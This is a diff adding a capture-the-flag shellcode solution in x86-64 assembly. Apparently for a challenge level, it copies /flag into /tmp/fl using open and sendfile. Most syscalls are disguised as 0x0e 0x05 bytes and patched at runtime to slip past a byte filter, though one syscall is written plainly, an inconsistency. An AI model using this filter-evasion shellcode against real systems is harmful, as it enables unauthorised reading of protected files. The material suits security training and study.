@@ -163,7 +163,58 @@ inc byte ptr [rip]
 
 ```
 ## 7
+把flag写到/tmp/fl里
 ```s
+.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+
+# open("/flag",NULL)
+push 0x616c662f
+mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
+push rsp
+pop rdi                     # mov rdi,rsp
+push 0
+pop rsi                     # xor rsi,rsi
+push 2
+pop rax                     # mov rax,2
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+mov rbx,rax
+
+# open("/tmp/fl",O_WRONLY | O_CREAT,0666)
+mov rax,0x6c662f706d742f
+push rax
+mov rdi,rsp
+mov rsi,65
+mov rdx,0666
+mov rax,2
+syscall
+
+# sendfile(fd1,fd,0,60)
+push rax
+pop rdi                     # mov rdi,rax
+push rbx
+pop rsi                     # mov rsi,rbx
+push 0
+pop rdx                     # xor rdx,rdx
+push 60
+pop r10                     # mov r10,60
+push 40
+pop rax                     # mov rax,40
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+
+# exit(0)
+push 0                      
+pop rdi                     # xor rdi,rdi
+push 60
+pop rax                     # mov rax,60
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+
+.section .data
 
 ```
 ## 8
